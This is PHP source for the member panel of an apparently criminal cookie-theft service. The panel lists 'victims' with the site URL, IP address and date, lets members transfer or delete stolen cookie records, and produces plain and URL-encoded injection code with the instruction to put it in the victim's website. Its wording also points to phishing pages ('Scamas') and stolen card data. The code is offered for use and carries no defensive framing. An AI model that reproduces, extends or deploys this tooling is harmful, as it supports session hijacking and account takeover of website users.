<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################

switch($type){
	case '';
	if(user_level == 0){
		echo ' <div class="head_panel">.: Victimes coockies Control  :.</div>	
				<div class="body_panel">
				Soory You Must Be Member To See Your Vistimes  <br />
				Sing Up for Get Your Profisionel Scamas <br />
				<a href="?do=register">Sing Up Here</a>
				</div>';
	}else{
		echo '<div class="head_panel">.: Victimes coockies Control :.</div>	
				<div class="body_panel">
			<table border="1" width="100%">
				<tr>
					<td colspan="6" height="32"> Get A New Code Coockies : <a href="?do=coockie&type=get_code&coockies_id_comp='.user_id.'">Get My code Now</a></td>
				</tr>	
				<tr class="tr3">
					<td width="48" align="center" height="32">#</td>
					<td align="center" height="32">website Victime</td>
					<td align="center" height="32">Date</td>
					<td align="center" height="32">Victime Ip</td>
					<td align="center" height="32">Option </td>
				</tr>';
		
		$cod_sql_visa = "SELECT coockie_id,sit_url_victime,ip_coockies,date_coockie FROM ".prifex."coockies WHERE user_id_coockie = '".user_id."' AND coockie_deleted != '1' ORDER BY coockie_id DESC";
		$sql_select_all_visas = mysql_query($cod_sql_visa) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	 	$num_sql_victims_info = mysql_num_rows($sql_select_all_visas);
		if($num_sql_victims_info > 0){	
			while($row_victims_info = mysql_fetch_object($sql_select_all_visas)){
			$coockie_id = $row_victims_info->coockie_id;
			$sit_url_victime = htmlspecialchars($row_victims_info->sit_url_victime);
			$ccnum = $row_victims_info->ccnum;
			$ip_coockies = $row_victims_info->ip_coockies;
			$date_coockie = $row_victims_info->date_coockie;
		echo '<tr class="tr1">
					<td width="48" align="center">'.$coockie_id.'</td>
					<td align="center"><a href="?do=show_coockie&id='.$coockie_id.'">'.$sit_url_victime.'</a></td>
					<td align="center">'.date_normal($date_coockie).'</td>
					<td align="center"><b><font color="#00FF00">'.$ip_coockies.'</font></b></td>
					<td align="center">
					<a onclick="return confirm(\'Are You Sur To Delet This coockies Info\');" href="?do=coockie&type=delet_coockie&id='.$coockie_id.'">
				<img alt="Delet coockies Info"  src="image/folder_delete.gif" border="0"></a>
				<a onclick="return confirm(\'Are You Sur To Transfair This coockies Info To another Account\');" href="?do=coockie&type=trans_coockie&coockie_info_id='.$coockie_id.'">
				<img alt="transfair this coockies Info To another Account"  src="image/folder_trans.gif" border="0"></a>
					</td>
				</tr>';
			}
		}else{
		echo '<tr class="tr1">
			<td  colspan="7" height="32" align="center">
				There is Not Card Info Now
			</td>
		</tr>';
		}
			echo '</table>
		</div>';
	}
		break;
	case 'trans_coockie':
	if(user_level > 0){
	$coockie_info_id = trim(intval($_GET['coockie_info_id']));
	$id_comp = trim(intval($_GET['id_comp']));
	if(!isset($coockie_info_id) OR empty($coockie_info_id) OR $coockie_info_id == ''){
	  	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					You Should Select Any coockies Info
				</div>';	
	}else{
		if(!isset($id_comp) OR empty($id_comp) OR $id_comp == ''){
		echo '<div class="head_panel">.: Victimes coockies Control  :.</div>	
					<div class="body_panel">
							Transfair This coockies Info To Another User Compt 
						Put Here Id Of Compt To Transfair Data And Click Transfair Button<br />
						<form method="GET" action="">
							<input class="inpt" type="text" name="id_comp" size="20">
							<input type="hidden" name="do" value="coockie" size="20">
							<input type="hidden" name="type" value="trans_coockie" size="20">
							<input type="hidden" name="coockie_info_id" value="'.$coockie_info_id.'" size="20">
							<input class="inpt" type="submit" value="Transfair" >
						</form>
						</div>';
		}else{
			$cod_sql = "UPDATE ".prifex."coockies SET user_id_coockie = '$id_comp' WHERE coockie_id = '$coockie_info_id'";
			$sql_select_scama_id = mysql_query($cod_sql) or die (error_sql(mysql_error(),__LINE__,__FILE__));
			echo '<div class="head_panel">.: User Control  :.</div>	
						<div class="body_panel">
							Transfaired coockies Info To Compt Id ( '.$id_comp.' ) Done 
						</div>';
			  redirect();
		}
	}
	  	  }else{
	  	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					You Don\'t Have a Permition
				</div>';
	  }
	break;
	case 'get_code':
	if(user_level > 0){
	$site_coockies_victime = trim($_GET['site_coockies_victime']);
	$coockies_id_comp = trim(intval($_GET['coockies_id_comp']));
	$user_code_coockies = str_ireplace('[user_id]',$coockies_id_comp,$user_coockies_code);
	$user_code_coockies = str_ireplace('[site_victime_coockies]',$site_coockies_victime,$user_code_coockies);
	if(!isset($coockies_id_comp) OR empty($coockies_id_comp) OR $coockies_id_comp == 0 or !isset($site_coockies_victime) OR empty($site_coockies_victime) OR $site_coockies_victime == ''){
		echo '<div class="head_panel">.: Victimes coockies Control  :.</div>	
					<div class="body_panel">
							Get A New Code Coockies  <br />
						Put Here url of website And Click Get Code Now <br /> <br />
						<form method="GET" action="">
							<input class="inpt" type="text" name="site_coockies_victime" size="20">
							<input type="hidden" name="do" value="coockie" size="20">
							<input type="hidden" name="type" value="get_code" size="20">
							<input type="hidden" name="coockies_id_comp" value="'.$coockies_id_comp.'" size="20">
							<input class="inpt" type="submit" value="Get Code Now" >
						</form>
						</div>';
	}else{
		echo '<div class="head_panel">.: Victimes coockies Control  :.</div>	
					<div class="body_panel">
						Copy This Code And Put It in Victime Website<br /><br />
							Simple Code : <br />
							<textarea class="inpt" rows="4" cols="99">'.htmlspecialchars(stripcslashes($user_code_coockies)).'</textarea>
							Encoding code : <br />
							<textarea class="inpt" rows="4" cols="99">'.urlencode(htmlspecialchars(stripcslashes($user_code_coockies))).'</textarea>
						</div>';
	}
	  }else{
	  	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					You Don\'t Have a Permition
				</div>';
	  }
	break;
	case 'delet_coockie':
	if(user_level > 0){
	$cod_sql = "UPDATE ".prifex."coockies SET coockie_deleted = '1' WHERE coockie_id = '$id'";
	$sql_select_scama_id = mysql_query($cod_sql) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					Deleted coockies Info Done 
				</div>';
	  redirect();
	  }else{
	  	echo '<div class="head_panel">.: User Control  :.</div>	
				<div class="body_panel">
					You Don\'t Have a Permition
				</div>';
	  }
	break;
}

	
?>